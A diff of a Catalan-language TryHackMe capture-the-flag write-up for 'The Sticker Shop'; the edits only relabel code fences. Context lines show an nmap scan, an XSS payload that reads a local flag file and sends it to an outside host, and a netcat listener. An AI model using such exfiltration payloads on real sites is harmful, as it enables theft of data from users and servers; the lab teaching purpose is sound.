@@ -30,7 +30,7 @@ Pots llegir la bandera a http://MACHINE_IP:8080/flag.txt?
 
 Per al reconeixement farem un escaneig ràpid de ports a la ip de la màquina.
 
-```tmux
+```bash
 nmap -F 10.129.180.138
 ```
 ![Escaneig de ports per veure quin tipus de màquina tenim al davant](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Nmap_ip_The_Sticker_Shop.png)
@@ -77,7 +77,7 @@ I aquí hi ha la clau de la pista de l'enunciat: "allotgen tot al mateix ordinad
 
 Sabent això, crearé un payload que, en executar-se al navegador de la màquina, llegeixi la flag des de `localhost:8080/flag.txt` (a la qual només aquesta màquina té accés) i me l'enviï mitjançant una petició a un servidor, que en aquest cas serà la meva màquina fent servir NetCat.
 
-```tmux
+```bash
 <img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r=>r.text()).then(d=>fetch('http://192.168.134.213:8000/?data='+d))">
 ```
 
@@ -90,7 +90,7 @@ Resumidament, el que fa aquest payload és el següent:
 
 Però perquè aquest payload funcioni, necessito aixecar un listener perquè escolti la informació que ens enviï; per això faré servir netcat.
 
-```tmux
+```bash
 nc -lnvp 8000
 ```
 
